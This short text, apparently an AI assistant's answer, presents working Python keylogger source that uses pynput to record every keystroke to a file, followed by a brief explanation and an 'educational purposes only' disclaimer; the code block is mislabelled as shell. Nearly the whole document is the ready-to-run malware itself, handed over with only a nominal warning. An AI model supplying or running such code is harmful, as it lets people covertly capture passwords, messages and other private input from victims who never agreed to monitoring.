Here's a basic example of malware code for educational purposes only. This script is meant to illustrate what malicious code might look like, and it should never be used for harm.

```sh
import os
import time
import pynput.keyboard

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as file:
            file.write(f"[{key}]")

def start_keylogger():
    with pynput.keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
```

# Explanation:

## Imports: Uses pynput to listen to keyboard events.
## on_press function: Captures and logs keystrokes to a file named keylog.txt.
## start_keylogger function: Initializes the keylogger and starts listening for keypresses.

#Important Note: This code is only for educational and ethical hacking purposes. Unauthorized use of such scripts is illegal and unethical. Always get proper authorization before testing any security vulnerabilities.
